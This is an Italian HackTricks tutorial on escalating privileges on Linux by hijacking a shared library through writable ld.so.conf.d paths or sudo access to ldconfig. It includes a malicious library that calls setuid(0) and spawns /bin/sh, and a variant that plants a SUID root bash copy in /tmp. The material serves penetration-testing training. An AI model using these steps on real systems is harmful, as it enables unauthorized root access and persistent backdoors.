# Esempio di exploit di privesc di ld.so

{{#include ../../banners/hacktricks-training.md}}

## Preparazione dell'ambiente

Nella sezione seguente puoi trovare il codice dei file che utilizzeremo per preparare l'ambiente

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Crea** quei file nella stessa cartella della tua macchina
2. **Compila la** **libreria**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copia** `libcustom.so` in `/usr/lib` e aggiorna la cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (privilegi root)
4. **Compila l'** **eseguibile**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Controlla l'ambiente

Controlla che _libcustom.so_ venga **caricata** da _/usr/lib_ e che tu possa **eseguire** il binario.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Comandi utili di triage

Quando attacchi un target reale, verifica il **nome esatto della libreria** di cui il binary ha bisogno e cosa il loader sta **risolvendo attualmente**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Alcuni dettagli utili:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` di solito **non funziona** perché la redirezione viene eseguita dalla shell corrente. Usa invece
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- I binari **SUID/privileged** ignorano `LD_LIBRARY_PATH`/`LD_PRELOAD` in
**secure-execution mode**, ma le directory provenienti da `/etc/ld.so.conf` fanno ancora parte della configurazione trusted del loader, quindi questa misconfiguration può comunque influire sui programmi privilegiati.
- Nelle versioni più recenti di glibc, il dynamic loader espone anche
`--list-diagnostics`, utile per eseguire il debug della risoluzione della cache e della selezione delle sottodirectory `glibc-hwcaps` quando un hijack non si comporta come previsto.

## Exploit

In questo scenario supporremo che **qualcuno abbia creato una vulnerable entry** all'interno di un file in _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
La cartella vulnerabile è _/home/ubuntu/lib_ (dove abbiamo accesso in scrittura).\
**Scarica e compila** il seguente codice all'interno di quel percorso:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Se prevedi che **root** (o un altro account privilegiato) esegua in seguito il binario vulnerabile, di solito è meglio lasciare un **artefatto di proprietà di root** invece di avviare una shell interattiva. Ad esempio:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Poi, dopo l'esecuzione con privilegi, puoi usare `/tmp/rootbash -p`.

Ora che abbiamo **creato la libreria libcustom malevola all'interno del percorso configurato in modo errato**, dobbiamo attendere un **riavvio** oppure che l'utente root esegua **`ldconfig`** (_nel caso in cui tu possa eseguire questo binario come **sudo** o disponga del **suid bit**, potrai eseguirlo personalmente_).

Dopo che ciò è avvenuto, **controlla nuovamente** da dove l'eseguibile `sharedvuln` sta caricando la libreria `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Come puoi vedere, **lo sta caricando da `/home/ubuntu/lib`** e, se un qualsiasi utente lo esegue, verrà eseguita una shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Nota che in questo esempio non abbiamo effettuato un'escalation dei privilegi, ma modificando i comandi eseguiti e **aspettando che root o un altro utente privilegiato esegua il binary vulnerabile** saremo in grado di effettuare un'escalation dei privilegi.

### Altre misconfigurations - Same vuln

Nell'esempio precedente abbiamo simulato una misconfiguration in cui un amministratore **ha impostato una cartella non privilegiata all'interno di un file di configurazione dentro `/etc/ld.so.conf.d/`**.\
Ma esistono altre misconfigurations che possono causare la stessa vulnerabilità: se disponi di **permessi di scrittura** su qualche **file di configurazione** dentro `/etc/ld.so.conf.d/`, nella cartella `/etc/ld.so.conf.d` o nel file `/etc/ld.so.conf`, puoi configurare la stessa vulnerabilità ed effettuare l'exploit.

## Exploit 2

**Supponiamo che tu disponga di privilegi sudo su `ldconfig`**.\
Puoi indicare a `ldconfig` **da dove caricare i file di configurazione**, quindi possiamo sfruttarlo per fare in modo che `ldconfig` carichi cartelle arbitrarie.\
Creiamo quindi i file e le cartelle necessari per caricare "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Ora, come indicato nel **previous exploit**, **crea la libreria malevola all'interno di `/tmp`**.\
E infine, carichiamo il path e controlliamo da dove il binario sta caricando la libreria:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Come puoi vedere, disponendo di privilegi sudo su `ldconfig`, puoi sfruttare la stessa vulnerabilità.**



## Riferimenti

- [ld.so(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
